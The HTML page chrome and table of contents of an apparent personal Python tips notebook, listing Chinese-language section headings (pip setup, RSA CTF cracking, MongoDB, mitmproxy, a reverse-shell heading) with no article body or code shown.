
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="我的技术笔记本~">
      
      
      
        <meta name="author" content="chenyuan">
      
      <link rel="shortcut icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.0.1">
    
    
      
        <title>Python - notebook</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.38780c08.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.3f72e892.min.css">
        
      
    
    
    
      
        
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="/assets/css/fonts.css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
      
    
    
    
    
      
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
      
  
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#python" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid" aria-label="Header">
    <a href=".." title="notebook" class="md-header-nav__button md-logo" aria-label="notebook">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    <label class="md-header-nav__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header-nav__title" data-md-component="header-title">
      
        <div class="md-header-nav__ellipsis">
          <span class="md-header-nav__topic md-ellipsis">
            notebook
          </span>
          <span class="md-header-nav__topic md-ellipsis">
            
              Python
            
          </span>
        </div>
      
    </div>
    
      <label class="md-header-nav__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header-nav__source">
        
<a href="https://github.com/zjuchenyuan/notebook/" title="Go to repository" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="notebook" class="md-nav__button md-logo" aria-label="notebook">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    notebook
  </label>
  
    <div class="md-nav__source">
      
<a href="https://github.com/zjuchenyuan/notebook/" title="Go to repository" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href=".." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
    
    <label class="md-nav__link" for="nav-2">
      Python
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Python" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        <span class="md-nav__icon md-icon"></span>
        Python
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Python
        <span class="md-nav__icon md-icon"></span>
      </label>
    
    <a href="./" title="Python" class="md-nav__link md-nav__link--active">
      Python
    </a>
    
      
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#pip" class="md-nav__link">
    安装pip
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pip-mirrorsaliyuncom" class="md-nav__link">
    设置pip源 - mirrors.aliyun.com
  </a>
  
    <nav class="md-nav" aria-label="设置pip源 - mirrors.aliyun.com">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#shell" class="md-nav__link">
    反弹shell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tty" class="md-nav__link">
    获得一个tty
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#requestsip" class="md-nav__link">
    让requests使用多个IP
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python_1" class="md-nav__link">
    Python多线程模板
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#httpserverbasehttpserver" class="md-nav__link">
    http.server（BaseHTTPServer）并发性改善
  </a>
  
    <nav class="md-nav" aria-label="http.server（BaseHTTPServer）并发性改善">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#new-version" class="md-nav__link">
    New version 不必修改库代码
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#old-version" class="md-nav__link">
    Old version 修改库代码(不建议)
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rootpython" class="md-nav__link">
    无root权限安装Python
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    中文输出乱码问题
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pep8" class="md-nav__link">
    遵循PEP8检查你的代码
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    生成随机字符串
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python_2" class="md-nav__link">
    Python解方程
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#in" class="md-nav__link">
    大数据判断in
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonh-no-such-file-or-directory" class="md-nav__link">
    解决Python.h: No such file or directory
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    二进制字符串转普通字符串
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#bytes" class="md-nav__link">
    十六进制字符串转bytes字符串
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python3pat" class="md-nav__link">
    用Python3写PAT心得
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#requestspost" class="md-nav__link">
    用requests进行post
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tkinter" class="md-nav__link">
    通过tkinter获取、修改剪贴板
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    符号数与无符号数转换
  </a>
  
    <nav class="md-nav" aria-label="符号数与无符号数转换">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    无符号→有符号，为了加上负号：
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    有符号→无符号，为了去掉负号：
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#signalsigalrm-only-linux" class="md-nav__link">
    使用signal.SIGALRM在限定时间后退出进程 (only Linux)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ctrlc" class="md-nav__link">
    捕捉用户的Ctrl+C
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#signalsigalrm-only-linux_1" class="md-nav__link">
    使用signal.SIGALRM实现定时器 (only Linux)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pdb" class="md-nav__link">
    使用pdb进行调试
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonserverlessfunction-as-service" class="md-nav__link">
    使用Python开发Serverless(Function as Service)后端服务
  </a>
  
    <nav class="md-nav" aria-label="使用Python开发Serverless(Function as Service)后端服务">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    踩过的坑与解决过程(论阿里云是怎么把人气死的)
  </a>
  
    <nav class="md-nav" aria-label="踩过的坑与解决过程(论阿里云是怎么把人气死的)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1api" class="md-nav__link">
    1.API网关与函数计算的对接
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2api" class="md-nav__link">
    2.修改API网关参数定义后要再次发布
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3windowsfclifcliexe" class="md-nav__link">
    3.不能使用Windows版本的fcli工具(fcli.exe)
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linuxgbk" class="md-nav__link">
    修复Linux下gbk编码的文件名
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#crack-rsa" class="md-nav__link">
    Crack RSA!
  </a>
  
    <nav class="md-nav" aria-label="Crack RSA!">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    题目信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rsa" class="md-nav__link">
    RSA是啥
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    破解的数学原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    实现它
  </a>
  
    <nav class="md-nav" aria-label="实现它">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ne" class="md-nav__link">
    题目给的公钥是啥格式，怎么读取出N和e?
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#n-pq" class="md-nav__link">
    怎么分解n 得到p和q？
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#d" class="md-nav__link">
    怎么计算私钥d
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flagencint" class="md-nav__link">
    怎么把flag.enc当成一个int读入？
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    计算明文
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flag" class="md-nav__link">
    明文这么一个大数 我要的flag呢？
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    完整的代码
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    时间戳与字符串相互转换
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#redis" class="md-nav__link">
    用redis存储字典
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nexushd" class="md-nav__link">
    搬运种子 从北邮人搬运到NexusHD
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python-seleniumdocker-chrome-headless" class="md-nav__link">
    python selenium+Docker chrome headless爬复杂网页
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonroot" class="md-nav__link">
    python丢弃root权限
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python-transmissionrpc" class="md-nav__link">
    python transmissionrpc
  </a>
  
    <nav class="md-nav" aria-label="python transmissionrpc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    上传一个种子 开始下载
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#torrent" class="md-nav__link">
    获取完整的torrent对象
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tracker" class="md-nav__link">
    给种子增加一个tracker
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#torrenttracker" class="md-nav__link">
    修改一个.torrent文件的tracker
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#uwsgi" class="md-nav__link">
    uwsgi优雅重启
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#flask" class="md-nav__link">
    flask设置一堆静态目录
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python35-openutf-8" class="md-nav__link">
    Python3.5 open打开文件默认使用utf-8
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonurl" class="md-nav__link">
    Python提取url 正则匹配的回溯爆炸问题
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ubuntugmpy2" class="md-nav__link">
    ubuntu安装gmpy2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#flask_1" class="md-nav__link">
    Flask模板 删去循环引入的多余空格
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sentry" class="md-nav__link">
    使用sentry
  </a>
  
    <nav class="md-nav" aria-label="使用sentry">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sentry_1" class="md-nav__link">
    不要过于依赖Sentry
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pysysargv" class="md-nav__link">
    解决命令行执行py文件没有sys.argv的问题
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonwindows-chromecookie" class="md-nav__link">
    Python获取Windows Chrome的Cookie
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#winencodingutf-8" class="md-nav__link">
    Win开发摆脱每次都要写的encoding=utf-8
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ubuntu1604python37" class="md-nav__link">
    Ubuntu16.04安装Python3.7
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#keyboardinterrupt" class="md-nav__link">
    判断代码是否卡住，自动发送KeyboardInterrupt
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonstartup-pythonimport" class="md-nav__link">
    设置PYTHONSTARTUP环境变量 启动Python自动执行一些import
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonmongodb" class="md-nav__link">
    Python使用MongoDB
  </a>
  
    <nav class="md-nav" aria-label="Python使用MongoDB">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#server" class="md-nav__link">
    安装server
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_15" class="md-nav__link">
    增删查改
  </a>
  
    <nav class="md-nav" aria-label="增删查改">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_16" class="md-nav__link">
    查询
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_17" class="md-nav__link">
    批量增加
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_18" class="md-nav__link">
    删除
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#join" class="md-nav__link">
    多表join查询
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_19" class="md-nav__link">
    随机采样
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pyenvpython" class="md-nav__link">
    使用pyenv编译安装不同版本的Python
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_20" class="md-nav__link">
    发送钉钉消息
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#mitmproxy" class="md-nav__link">
    使用mitmproxy
  </a>
  
</li>
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../gist/" title="Gist Python一些常用代码片段" class="md-nav__link">
      Gist Python一些常用代码片段
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../PythonCourse/" title="Course Python程序设计" class="md-nav__link">
      Course Python程序设计
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      Programming Languages
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Programming Languages" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        <span class="md-nav__icon md-icon"></span>
        Programming Languages
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../BASH/" title="BASH" class="md-nav__link">
      BASH
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../BAT/" title="BAT批处理" class="md-nav__link">
      BAT批处理
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../C/" title="C语言" class="md-nav__link">
      C语言
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4">
    
    <label class="md-nav__link" for="nav-3-4">
      Java
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Java" data-md-level="2">
      <label class="md-nav__title" for="nav-3-4">
        <span class="md-nav__icon md-icon"></span>
        Java
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../Java/" title="Java" class="md-nav__link">
      Java
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../S2-045/" title="S2-045" class="md-nav__link">
      S2-045
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../JavaScript/" title="JavaScript" class="md-nav__link">
      JavaScript
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../PHP/" title="PHP" class="md-nav__link">
      PHP
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
    
    <label class="md-nav__link" for="nav-4">
      Web
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Web" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        <span class="md-nav__icon md-icon"></span>
        Web
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../CDN/" title="CDN" class="md-nav__link">
      CDN
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../cURL/" title="cURL" class="md-nav__link">
      cURL
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4-3" type="checkbox" id="nav-4-3">
    
    <label class="md-nav__link" for="nav-4-3">
      Favorites
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Favorites" data-md-level="2">
      <label class="md-nav__title" for="nav-4-3">
        <span class="md-nav__icon md-icon"></span>
        Favorites
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../Favorites/" title="Favorites" class="md-nav__link">
      Favorites
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../GithubProjectRecommendation/" title="Github Project Recommendation" class="md-nav__link">
      Github Project Recommendation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Links/" title="更多链接" class="md-nav__link">
      更多链接
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Flask/" title="Flask" class="md-nav__link">
      Flask
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../MySQL/" title="MySQL" class="md-nav__link">
      MySQL
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Nginx/" title="Nginx" class="md-nav__link">
      Nginx
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../RabbitMQ/" title="RabbitMQ" class="md-nav__link">
      RabbitMQ
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
    
    <label class="md-nav__link" for="nav-5">
      Development
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Development" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        <span class="md-nav__icon md-icon"></span>
        Development
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../Developer/" title="Developer" class="md-nav__link">
      Developer
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Docker/" title="Docker" class="md-nav__link">
      Docker
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../ETH/" title="ETH" class="md-nav__link">
      ETH
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Git/" title="Git" class="md-nav__link">
      Git
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Jekyll/" title="Jekyll" class="md-nav__link">
      Jekyll
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../PaperReading/" title="Paper Reading" class="md-nav__link">
      Paper Reading
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../WindowsSoftware/" title="WindowsSoftware" class="md-nav__link">
      WindowsSoftware
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
    
    <label class="md-nav__link" for="nav-6">
      Fuzzing
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Fuzzing" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        <span class="md-nav__icon md-icon"></span>
        Fuzzing
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../dfsan/" title="DFSan" class="md-nav__link">
      DFSan
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
    
    <label class="md-nav__link" for="nav-7">
      Fun
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Fun" data-md-level="1">
      <label class="md-nav__title" for="nav-7">
        <span class="md-nav__icon md-icon"></span>
        Fun
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../Bitcoin/" title="Bitcoin" class="md-nav__link">
      Bitcoin
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8">
    
    <label class="md-nav__link" for="nav-8">
      Linux
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux" data-md-level="1">
      <label class="md-nav__title" for="nav-8">
        <span class="md-nav__icon md-icon"></span>
        Linux
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../Linux-backup/" title="Linux-backup" class="md-nav__link">
      Linux-backup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Linux-setup/" title="Linux-setup" class="md-nav__link">
      Linux-setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Linux-SSH/" title="Linux-SSH" class="md-nav__link">
      Linux-SSH
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Linux-cli/" title="Linux-cli" class="md-nav__link">
      Linux-cli
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Linux-VirtualBox/" title="Linux-VirtualBox" class="md-nav__link">
      Linux-VirtualBox
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Ubuntu/" title="Ubuntu" class="md-nav__link">
      Ubuntu
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9" type="checkbox" id="nav-9">
    
    <label class="md-nav__link" for="nav-9">
      My Projects
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="My Projects" data-md-level="1">
      <label class="md-nav__title" for="nav-9">
        <span class="md-nav__icon md-icon"></span>
        My Projects
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../zjugrshelper/" title="ZJU grs helper" class="md-nav__link">
      ZJU grs helper
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../ccfbadge/" title="CCF Badge" class="md-nav__link">
      CCF Badge
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
